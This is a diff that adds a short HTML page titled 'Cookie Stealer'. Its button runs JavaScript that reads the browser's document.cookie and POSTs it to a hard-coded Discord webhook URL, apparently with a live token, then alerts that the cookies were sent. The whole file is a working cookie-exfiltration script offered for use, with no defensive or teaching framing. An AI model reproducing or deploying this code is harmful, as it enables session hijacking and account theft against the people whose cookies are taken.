@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Stealer</title>
+</head>
+<body>
+    <h1>Cookie Stealer</h1>
+    <button onclick="stealCookies()">Steal Cookies</button>
+    
+    <script>
+        function stealCookies() {
+            // Get all cookies
+            var cookies = document.cookie;
+            
+            // Prepare data to send
+            var postData = {
+                cookies: cookies
+            };
+
+            // Send data to webhook (replace WEBHOOK_URL with your Discord webhook URL)
+            fetch('https://discord.com/api/webhooks/1268754518368190566/JXVjXJOJze0O9B7LRR_SwRJhLTgzPAUw98XC6jy6Ur6O17MimvaTuwa1BtqUoQaYXxk_', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(postData),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                alert('Cookies successfully sent to Discord webhook!');
+            })
+            .catch(error => {
+                console.error('Error sending cookies:', error);
+                alert('Failed to send cookies to Discord webhook.');
+            });
+        }
+    </script>
+</body>
+</html>
